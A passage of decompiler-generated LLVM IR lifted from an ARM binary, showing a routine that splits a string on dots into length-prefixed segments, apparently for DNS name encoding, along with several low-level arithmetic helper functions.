  %v1_17d84 = phi i32 [ %v0_17d60, %dec_label_pc_17d54 ], [ -1, %dec_label_pc_17d70 ]
  %v2_17d80 = phi i32 [ %v3_17d54, %dec_label_pc_17d54 ], [ %v2_17d80.pre, %dec_label_pc_17d70 ]
  store i32 %v2_17d80, i32* @r7, align 4
  ret i32 %v1_17d84

; uselistorder directives
  uselistorder i32 %v0_17d60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @function_d0ec, { 49, 48, 33, 46, 18, 45, 44, 43, 42, 85, 84, 83, 37, 17, 32, 31, 79, 78, 77, 71, 59, 47, 36, 30, 29, 82, 81, 76, 74, 73, 72, 5, 4, 3, 39, 34, 15, 75, 2, 80, 58, 1, 57, 56, 55, 14, 13, 12, 41, 40, 70, 69, 68, 38, 11, 10, 28, 64, 51, 27, 26, 35, 25, 24, 23, 22, 21, 67, 6, 8, 54, 53, 52, 7, 9, 16, 50, 0, 20, 19, 66, 65, 63, 62, 61, 60 }
  uselistorder i32* @r7, { 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 111, 112, 279, 280, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 140, 141, 142, 143, 144, 145, 146, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 18, 19, 20, 21, 0, 22, 3, 23, 27, 24, 25, 26, 28, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 199, 5, 200, 201, 202, 30, 31, 32, 33, 34, 35, 36, 37, 113, 38, 39, 54, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 6, 237, 238, 239, 240, 241, 242, 243, 1, 244, 245, 246, 247, 281, 7, 282, 285, 286, 104, 8, 105, 106, 107, 108, 109, 110, 40, 41, 46, 47, 48, 49, 42, 43, 44, 45, 50, 51, 52, 53, 324, 325, 326, 327, 85, 86, 287, 288, 29, 75, 76, 77, 78, 79, 80, 81, 328, 329, 330, 333, 334, 9, 55, 56, 134, 10, 135, 136, 137, 2, 138, 139, 58, 59, 4, 60, 57, 87, 88, 11, 89, 61, 62, 289, 290, 291, 292, 293, 294, 295, 296, 297, 147, 148, 149, 150, 151, 152, 298, 299, 300, 301, 302, 303, 304, 305, 12, 306, 307, 308, 248, 249, 250, 251, 252, 253, 192, 193, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 13, 309, 310, 311, 14, 312, 313, 314, 17, 315, 65, 15, 66, 67, 194, 195, 196, 197, 198, 316, 16, 317, 318, 265, 266, 271, 272, 63, 64, 267, 268, 269, 270, 82, 83, 84, 273, 274, 275, 276, 319, 320, 323, 321, 322, 283, 284, 90, 91, 331, 332, 277, 278, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder label %dec_label_pc_17d80, { 1, 0 }
}

define i32 @function_17d88(i8* %arg1) local_unnamed_addr {
dec_label_pc_17d88:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_17d88 = load i32, i32* @r4, align 4
  store i32 %v3_17d88, i32* %stack_var_-32, align 4
  %v6_17d88 = load i32, i32* @r5, align 4
  %v9_17d88 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17d90 = load i32, i32* @r1, align 4
  store i32 %v0_17d90, i32* %r8.global-to-local, align 4
  %v0_17d94 = load i32, i32* @r2, align 4
  store i32 %v0_17d94, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17dfc23 = icmp slt i8* %arg1, null
  store i1 %v1_17dfc23, i1* %cpsr_n.global-to-local, align 1
  %v2_17dfc24 = icmp eq i8* %arg1, null
  store i1 %v2_17dfc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17dfc24, label %dec_label_pc_17e14, label %dec_label_pc_17e08

dec_label_pc_17da0:                               ; preds = %dec_label_pc_17e08
  %v2_17da0 = call i32 @function_15078(i32 %v0_17da026, i32 46)
  store i32 %v2_17da0, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17da4 = icmp slt i32 %v2_17da0, 0
  store i1 %v1_17da4, i1* %cpsr_n.global-to-local, align 1
  %v2_17da4 = icmp eq i32 %v2_17da0, 0
  store i1 %v2_17da4, i1* %cpsr_z.global-to-local, align 1
  %v0_17da8 = load i32, i32* @r4, align 4
  %v2_17da8 = sub i32 %v2_17da0, %v0_17da8
  store i32 %v2_17da8, i32* @r5, align 4
  br i1 %v2_17da4, label %dec_label_pc_17db0, label %dec_label_pc_17dbc

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17da0
  store i32 %v0_17da8, i32* @r0, align 4
  %v0_17db4 = call i32 @function_f670()
  %sext = mul i32 %v0_17db4, 16777216
  %v1_17db8 = sdiv i32 %sext, 16777216
  store i32 %v1_17db8, i32* @r5, align 4
  %v0_17dc8.pre = load i32, i32* @r4, align 4
  %v0_17dd8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17dbc

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17da0, %dec_label_pc_17db0
  %v0_17dd8 = phi i32 [ %v2_17da0, %dec_label_pc_17da0 ], [ %v0_17dd8.pre, %dec_label_pc_17db0 ]
  %v0_17dc8 = phi i32 [ %v0_17da8, %dec_label_pc_17da0 ], [ %v0_17dc8.pre, %dec_label_pc_17db0 ]
  %v0_17de8 = phi i32 [ %v2_17da8, %dec_label_pc_17da0 ], [ %v1_17db8, %dec_label_pc_17db0 ]
  %v0_17dbc = load i32, i32* %sl.global-to-local, align 4
  %v1_17dbc = add i32 %v0_17dbc, 1
  store i32 %v1_17dbc, i32* %r7.global-to-local, align 4
  %v1_17dc0 = load i32, i32* %sb.global-to-local, align 4
  %v2_17dc0 = sub i32 %v1_17dc0, %v0_17dbc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17dc4 = icmp slt i32 %v0_17de8, 0
  store i1 %v1_17dc4, i1* %cpsr_n.global-to-local, align 1
  %v2_17dc4 = icmp eq i32 %v0_17de8, 0
  store i1 %v2_17dc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17dc8, i32* @r1, align 4
  %v0_17dcc = load i32, i32* %r8.global-to-local, align 4
  %v2_17dcc = add i32 %v0_17dcc, %v1_17dbc
  store i32 %v2_17dcc, i32* @r0, align 4
  store i32 %v0_17de8, i32* @r2, align 4
  %v1_17dd4 = add i32 %v2_17dc0, -1
  store i32 %v1_17dd4, i32* @r3, align 4
  %v1_17dd8 = add i32 %v0_17dd8, 1
  store i32 %v1_17dd8, i32* @r4, align 4
  br i1 %v2_17dc4, label %dec_label_pc_17e28, label %dec_label_pc_17de0

dec_label_pc_17de0:                               ; preds = %dec_label_pc_17dbc
  %v2_17de0 = sub i32 %v0_17de8, %v1_17dd4
  %v3_17de0 = icmp ult i32 %v0_17de8, %v1_17dd4
  %v4_17de0 = xor i32 %v1_17dd4, %v0_17de8
  %v5_17de0 = xor i32 %v2_17de0, %v0_17de8
  %v6_17de0 = and i32 %v5_17de0, %v4_17de0
  %v7_17de0 = icmp slt i32 %v6_17de0, 0
  store i1 %v7_17de0, i1* %cpsr_v.global-to-local, align 1
  %v8_17de0 = icmp slt i32 %v2_17de0, 0
  store i1 %v8_17de0, i1* %cpsr_n.global-to-local, align 1
  %v9_17de0 = icmp eq i32 %v0_17de8, %v1_17dd4
  store i1 %v9_17de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17de0, label %dec_label_pc_17de8, label %dec_label_pc_17e28

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17de0
  %v1_17de8 = trunc i32 %v0_17de8 to i8
  %v4_17de8 = add i32 %v0_17dcc, %v0_17dbc
  %v5_17de8 = inttoptr i32 %v4_17de8 to i8*
  store i8 %v1_17de8, i8* %v5_17de8, align 1
  %v0_17dec = call i32 @function_f700()
  store i32 %v0_17dec, i32* @r0, align 4
  %v0_17df0 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17df0 = icmp slt i32 %v0_17df0, 0
  store i1 %v1_17df0, i1* %cpsr_n.global-to-local, align 1
  %v2_17df0 = icmp eq i32 %v0_17df0, 0
  store i1 %v2_17df0, i1* %cpsr_z.global-to-local, align 1
  %v0_17df4 = load i32, i32* @r5, align 4
  %v1_17df4 = load i32, i32* %r7.global-to-local, align 4
  %v2_17df4 = add i32 %v1_17df4, %v0_17df4
  store i32 %v2_17df4, i32* %sl.global-to-local, align 4
  br i1 %v2_17df0, label %dec_label_pc_17e14, label %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge

dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge:  ; preds = %dec_label_pc_17de8
  %v0_17dfc.pre = load i32, i32* @r4, align 4
  store i32 %v0_17dfc.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17dfc = icmp slt i32 %v0_17dfc.pre, 0
  store i1 %v1_17dfc, i1* %cpsr_n.global-to-local, align 1
  %v2_17dfc = icmp eq i32 %v0_17dfc.pre, 0
  store i1 %v2_17dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17dfc, label %dec_label_pc_17e14, label %dec_label_pc_17e08

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17d88, %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge
  %v0_17da026 = phi i32 [ %v0_17dfc.pre, %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge ], [ %tmp, %dec_label_pc_17d88 ]
  %v5_17e1c525 = phi i32 [ %v2_17df4, %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge ], [ 0, %dec_label_pc_17d88 ]
  %v1_17e08 = inttoptr i32 %v0_17da026 to i8*
  %v2_17e08 = load i8, i8* %v1_17e08, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17e0c = icmp eq i8 %v2_17e08, 0
  store i1 %v2_17e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e0c, label %dec_label_pc_17e14, label %dec_label_pc_17da0

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge, %dec_label_pc_17de8, %dec_label_pc_17e08, %dec_label_pc_17d88
  %v8_17e20 = phi i32 [ 0, %dec_label_pc_17d88 ], [ %v5_17e1c525, %dec_label_pc_17e08 ], [ %v2_17df4, %dec_label_pc_17de8 ], [ %v2_17df4, %dec_label_pc_17de8.dec_label_pc_17dfc_crit_edge ]
  %v0_17e14 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17e14 = icmp slt i32 %v0_17e14, 0
  store i1 %v1_17e14, i1* %cpsr_n.global-to-local, align 1
  %v2_17e14 = icmp eq i32 %v0_17e14, 0
  store i1 %v2_17e14, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_17e14, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_17e14
  %v6_17e1c = add i32 %v8_17e20, 1
  store i32 %v6_17e1c, i32* @r0, align 4
  %v7_17e20 = load i32, i32* %r8.global-to-local, align 4
  %v9_17e20 = add i32 %v7_17e20, %v8_17e20
  %v10_17e20 = inttoptr i32 %v9_17e20 to i8*
  store i8 0, i8* %v10_17e20, align 1
  %v0_17e24.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_17e24.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17e24.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17e14, %bb
  %v2_17e24 = phi i1 [ %v2_17e24.pre, %bb ], [ false, %dec_label_pc_17e14 ]
  %v1_17e24 = phi i1 [ %v1_17e24.pre, %bb ], [ %v1_17e14, %dec_label_pc_17e14 ]
  %v0_17e24 = phi i1 [ %v0_17e24.pre, %bb ], [ %v2_17e14, %dec_label_pc_17e14 ]
  %v3_17e24 = xor i1 %v2_17e24, %v1_17e24
  %v4_17e24 = or i1 %v0_17e24, %v3_17e24
  br i1 %v4_17e24, label %dec_label_pc_17e28, label %.dec_label_pc_17e2c_crit_edge

.dec_label_pc_17e2c_crit_edge:                    ; preds = %bb22
  %v1_17e30.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_17e2c

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17de0, %dec_label_pc_17dbc, %bb22
  br label %dec_label_pc_17e2c

dec_label_pc_17e2c:                               ; preds = %.dec_label_pc_17e2c_crit_edge, %dec_label_pc_17e28
  %v1_17e30 = phi i32 [ %v1_17e30.pre, %.dec_label_pc_17e2c_crit_edge ], [ -1, %dec_label_pc_17e28 ]
  %v2_17e2c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17e2c, i32* @r4, align 4
  store i32 %v6_17d88, i32* @r5, align 4
  store i32 %v9_17d88, i32* @r6, align 4
  ret i32 %v1_17e30

; uselistorder directives
  uselistorder i32 %v0_17e14, { 0, 2, 1 }
  uselistorder i32 %v0_17dfc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17df0, { 1, 0 }
  uselistorder i32 %v2_17de0, { 1, 0 }
  uselistorder i32 %v1_17dd4, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_17de8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_17db8, { 1, 0 }
  uselistorder i1 %v2_17dfc24, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 6, 43, 0, 1, 45, 44, 46, 2, 47, 30, 48, 8, 9, 49, 3, 50, 51, 53, 52, 33, 54, 34, 10, 56, 55, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 58, 57, 35, 59, 4, 60, 61, 62, 31, 32, 64, 65, 63, 67, 66, 36, 68, 21, 69, 70, 71, 37, 72, 41, 73, 22, 74, 75, 76, 77, 78, 38, 23, 24, 25, 26, 27, 80, 81, 82, 83, 79, 28, 7, 85, 84, 29, 86, 87, 88, 39, 89, 90, 5, 91, 94, 92, 93, 95, 96, 97, 98, 99, 102, 101, 40, 100, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 42 }
  uselistorder i32 ()* @function_f700, { 21, 20, 19, 16, 15, 14, 13, 12, 11, 26, 10, 3, 8, 7, 1, 18, 17, 6, 5, 4, 0, 25, 24, 23, 22, 9, 2 }
  uselistorder i32 ()* @function_f670, { 18, 16, 15, 14, 12, 42, 41, 17, 13, 6, 5, 4, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 10, 9, 8, 7, 25, 24, 23, 22, 21, 20, 19, 11, 2, 0, 1, 3 }
  uselistorder i32 (i32, i32)* @function_15078, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6 }
  uselistorder i32 46, { 0, 1, 3, 4, 5, 2 }
  uselistorder label %dec_label_pc_17e2c, { 1, 0 }
  uselistorder label %dec_label_pc_17e28, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17e14, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17e08, { 1, 0 }
  uselistorder label %dec_label_pc_17dbc, { 1, 0 }
}

define i32 @function_17e34(i32 %arg1) local_unnamed_addr {
dec_label_pc_17e34:
  %v1_17e34 = sub i32 0, %arg1
  store i32 %v1_17e34, i32* @r1, align 4
  %v0_17e38 = call i32 @function_17e40()
  ret i32 %v0_17e38
}

define i32 @function_17e3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17e3c:
  %v2_17e3c = load i32, i32* @r0, align 4
  ret i32 %v2_17e3c
}

define i32 @function_17e40() local_unnamed_addr {
dec_label_pc_17e40:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17e40 = load i32, i32* @r4, align 4
  store i32 %v3_17e40, i32* %stack_var_-12, align 4
  %v6_17e40 = load i32, i32* @r5, align 4
  %v9_17e40 = load i32, i32* @lr, align 4
  %v0_17e44 = load i32, i32* @r1, align 4
  %v2_17e44 = mul i32 %v0_17e44, 2
  store i32 %v2_17e44, i32* %r4.global-to-local, align 4
  %v0_17e48 = load i32, i32* @r3, align 4
  %v2_17e48 = mul i32 %v0_17e48, 2
  store i32 %v2_17e48, i32* %r5.global-to-local, align 4
  %v4_17e4c = icmp eq i32 %v2_17e48, %v2_17e44
  %v1_17e50 = load i32, i32* @r0, align 4
  br i1 %v4_17e4c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17e40
  %v2_17e50 = load i32, i32* @r2, align 4
  %v5_17e50 = icmp eq i32 %v2_17e50, %v1_17e50
  br i1 %v5_17e50, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_17e40, %bb
  %v3_17e54 = or i32 %v1_17e50, %v2_17e44
  %v5_17e54 = icmp eq i32 %v3_17e54, 0
  br i1 %v5_17e54, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_17e58 = load i32, i32* @r2, align 4
  %v3_17e58 = or i32 %v2_17e58, %v2_17e48
  %v5_17e58 = icmp eq i32 %v3_17e58, 0
  br i1 %v5_17e58, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_17e44.off = add i32 %v2_17e44, 4194303
  %tmp = icmp ult i32 %v2_17e44.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_17e48.off = add i32 %v2_17e48, 4194303
  %tmp17 = icmp ult i32 %v2_17e48.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_17e64 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_17e64, i32 ptrtoint (i32* @global_var_1809c.724 to i32))
  %v0_17e68 = load i32, i32* %r4.global-to-local, align 4
  %v3_17e68 = udiv i32 %v0_17e68, 2097152
  store i32 %v3_17e68, i32* %r4.global-to-local, align 4
  %v1_17e6c = load i32, i32* %r5.global-to-local, align 4
  %v4_17e6c = udiv i32 %v1_17e6c, 2097152
  %v5_17e6c = sub nsw i32 %v4_17e6c, %v3_17e68
  %v5_17e70 = icmp ult i32 %v4_17e6c, %v3_17e68
  br i1 %v5_17e70, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_17e70 = sub nsw i32 0, %v5_17e6c
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_17e70, %bb13 ], [ %v5_17e6c, %.thread3 ]
  %v0_17e94 = phi i32 [ %v7_17e70, %bb13 ], [ %v5_17e6c, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_17e74 = icmp ugt i32 %v4_17e6c, %v3_17e68
  br i1 %v7_17e74, label %dec_label_pc_17e78, label %dec_label_pc_17e94

dec_label_pc_17e78:                               ; preds = %bb14
  %v2_17e78 = add nsw i32 %v0_17e94, %v3_17e68
  store i32 %v2_17e78, i32* %r4.global-to-local, align 4
  %v0_17e7c = load i32, i32* @r0, align 4
  %v1_17e7c = load i32, i32* @r2, align 4
  %v0_17e80 = load i32, i32* @r1, align 4
  %v1_17e80 = load i32, i32* @r3, align 4
  store i32 %v1_17e7c, i32* @r0, align 4
  store i32 %v1_17e80, i32* @r1, align 4
  store i32 %v0_17e7c, i32* @r2, align 4
  store i32 %v0_17e80, i32* @r3, align 4
  br label %dec_label_pc_17e94

dec_label_pc_17e94:                               ; preds = %bb14, %dec_label_pc_17e78
  %tmp18 = icmp ugt i32 %v0_17e94, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_17e94
  %v6_17e98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_17e98, i32* %r4.global-to-local, align 4
  store i32 %v6_17e40, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_17e94, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_17e40)
  %v0_17ea0 = load i32, i32* @r1, align 4
  %v3_17ea0 = icmp sgt i32 %v0_17ea0, -1
  br i1 %v3_17ea0, label %dec_label_pc_17ebc, label %dec_label_pc_17eb4

dec_label_pc_17eb4:                               ; preds = %bb16
  %v0_17eb4 = load i32, i32* @r0, align 4
  %v1_17eb4 = sub i32 0, %v0_17eb4
  store i32 %v1_17eb4, i32* @r0, align 4
  br label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %bb16, %dec_label_pc_17eb4
  %v0_17ebc = load i32, i32* @r3, align 4
  %v3_17ebc = icmp sgt i32 %v0_17ebc, -1
  br i1 %v3_17ebc, label %dec_label_pc_17ed4, label %dec_label_pc_17ecc

dec_label_pc_17ecc:                               ; preds = %dec_label_pc_17ebc
  br label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17ebc, %dec_label_pc_17ecc
  %v0_17ed4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17ed4 = load i32, i32* %r5.global-to-local, align 4
  %v4_17ed4 = icmp eq i32 %v1_17ed4, %v0_17ed4
  call void @__pseudo_cond_branch(i1 %v4_17ed4, i32 ptrtoint (i32* @global_var_18084.725 to i32))
  %v1_17ed8 = load i32, i32* @r0, align 4
  ret i32 %v1_17ed8

; uselistorder directives
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_17e6c, { 2, 1, 0 }
  uselistorder i32 %v3_17e68, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17e50, { 1, 0 }
  uselistorder i32 %v2_17e48, { 1, 3, 0, 2 }
  uselistorder i32 %v2_17e44, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_17ed4, { 1, 0 }
  uselistorder label %dec_label_pc_17ebc, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_17e94, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17edc() local_unnamed_addr {
dec_label_pc_17edc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_17edc = load i32, i32* @r4, align 4
  %v1_17edc = add i32 %v0_17edc, -1
  store i32 %v1_17edc, i32* @r4, align 4
  %v0_17ee0 = load i32, i32* @r5, align 4
  %v1_17ee0 = sub i32 32, %v0_17ee0
  store i32 %v1_17ee0, i32* @lr, align 4
  %v5_17ee4 = icmp sgt i32 %v0_17ee0, 32
  br i1 %v5_17ee4, label %dec_label_pc_17f00, label %dec_label_pc_17ee8

dec_label_pc_17ee8:                               ; preds = %dec_label_pc_17edc
  %v0_17ee8 = load i32, i32* @r2, align 4
  %v6_17ee8 = shl i32 %v0_17ee8, %v1_17ee0
  store i32 %v6_17ee8, i32* %ip.global-to-local, align 4
  %v0_17eec = load i32, i32* @r0, align 4
  %v3_17eec = add i32 %v0_17ee0, -1
  %v4_17eec = shl i32 1, %v3_17eec
  %v7_17eec = lshr i32 %v0_17ee8, %v0_17ee0
  %v8_17eec = add i32 %v0_17eec, %v7_17eec
  %v9_17eec = icmp ult i32 %v8_17eec, %v0_17eec
  %v0_17ef0 = load i32, i32* @r1, align 4
  %v2_17ef0 = zext i1 %v9_17eec to i32
  %v3_17ef0 = add i32 %v2_17ef0, %v0_17ef0
  %v1_17ef4 = load i32, i32* @r3, align 4
  %v7_17ef4 = shl i32 %v1_17ef4, %v1_17ee0
  %v8_17ef4 = add i32 %v7_17ef4, %v8_17eec
  store i32 %v8_17ef4, i32* %r0.global-to-local, align 4
  %v5_17ef8 = and i32 %v1_17ef4, %v4_17eec
  %v6_17ef8 = icmp ne i32 %v5_17ef8, 0
  %v7_17ef8 = ashr i32 %v1_17ef4, %v0_17ee0
  %v9_17ef8 = add i32 %v3_17ef0, %v7_17ef8
  %v10_17ef8 = zext i1 %v6_17ef8 to i32
  %v11_17ef8 = add i32 %v10_17ef8, %v9_17ef8
  br label %dec_label_pc_17f1c

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17edc
  %v1_17f00 = add i32 %v0_17ee0, -32
  %v1_17f04 = add i32 %v1_17ee0, 32
  store i32 %v1_17f04, i32* @lr, align 4
  %v0_17f0c = load i32, i32* @r3, align 4
  %v2_17f0c = add i32 %v1_17ee0, 31
  %v3_17f0c = lshr i32 -2147483648, %v2_17f0c
  %v4_17f0c = and i32 %v0_17f0c, %v3_17f0c
  %v5_17f0c = icmp ne i32 %v4_17f0c, 0
  %v6_17f0c = shl i32 %v0_17f0c, %v1_17f04
  %v2_17f10 = or i32 %v6_17f0c, 2
  %v2_17f10.v6_17f0c = select i1 %v5_17f0c, i32 %v2_17f10, i32 %v6_17f0c
  store i32 %v2_17f10.v6_17f0c, i32* %ip.global-to-local, align 4
  %v0_17f14 = load i32, i32* @r0, align 4
  %v7_17f14 = ashr i32 %v0_17f0c, %v1_17f00
  %v8_17f14 = add i32 %v0_17f14, %v7_17f14
  store i32 %v8_17f14, i32* %r0.global-to-local, align 4
  %v0_17f18 = load i32, i32* @r1, align 4
  %v2_17f18 = and i32 %v0_17f0c, 1073741824
  %v3_17f18 = icmp ne i32 %v2_17f18, 0
  %v4_17f18 = ashr i32 %v0_17f0c, 31
  %v6_17f18 = add i32 %v0_17f18, %v4_17f18
  %v7_17f18 = zext i1 %v3_17f18 to i32
  %v8_17f18 = add i32 %v6_17f18, %v7_17f18
  br label %dec_label_pc_17f1c

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17ee8, %dec_label_pc_17f00
  %storemerge = phi i32 [ %v11_17ef8, %dec_label_pc_17ee8 ], [ %v8_17f18, %dec_label_pc_17f00 ]
  %v0_17f1c = phi i32 [ %v11_17ef8, %dec_label_pc_17ee8 ], [ %v8_17f18, %dec_label_pc_17f00 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_17f1c = and i32 %v0_17f1c, -2147483648
  store i32 %v1_17f1c, i32* @r5, align 4
  %v1_17f20 = icmp sgt i32 %v0_17f1c, -1
  call void @__pseudo_cond_branch(i1 %v1_17f20, i32 ptrtoint (i32* @global_var_17f30.726 to i32))
  %v0_17f24 = load i32, i32* %ip.global-to-local, align 4
  %v1_17f24 = sub i32 0, %v0_17f24
  store i32 %v1_17f24, i32* %ip.global-to-local, align 4
  %v2_17f24 = icmp eq i32 %v0_17f24, 0
  %v0_17f28 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f28 = icmp eq i1 %v2_17f24, false
  %v5_17f28 = sext i1 %v2_17f28 to i32
  %v6_17f28 = sub i32 %v5_17f28, %v0_17f28
  store i32 %v6_17f28, i32* %r0.global-to-local, align 4
  %v7_17f28 = zext i1 %v2_17f28 to i32
  %v8_17f28 = icmp ne i32 %v6_17f28, %v7_17f28
  %v9_17f28 = icmp ne i32 %v0_17f28, -1
  %v10_17f28 = or i1 %v9_17f28, %v8_17f28
  %v11_17f28 = icmp ne i32 %v0_17f28, 0
  %v12_17f28 = select i1 %v2_17f28, i1 %v10_17f28, i1 %v11_17f28
  %v0_17f2c = load i32, i32* %r1.global-to-local, align 4
  %v5_17f2c = sext i1 %v12_17f28 to i32
  %v6_17f2c = sub i32 %v5_17f2c, %v0_17f2c
  store i32 %v6_17f2c, i32* @r1, align 4
  ret i32 %v6_17f28

; uselistorder directives
  uselistorder i1 %v2_17f28, { 1, 2, 0 }
  uselistorder i32 %v0_17f28, { 1, 2, 0 }
  uselistorder i32 %v8_17f18, { 1, 0 }
  uselistorder i32 %v0_17f0c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_17ef8, { 1, 0 }
  uselistorder i32 %v1_17ef4, { 1, 0, 2 }
  uselistorder i32 %v0_17eec, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_17f1c, { 1, 0 }
}

define i32 @function_17f30(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17f30:
  %r0.global-to-local = alloca i32, align 4
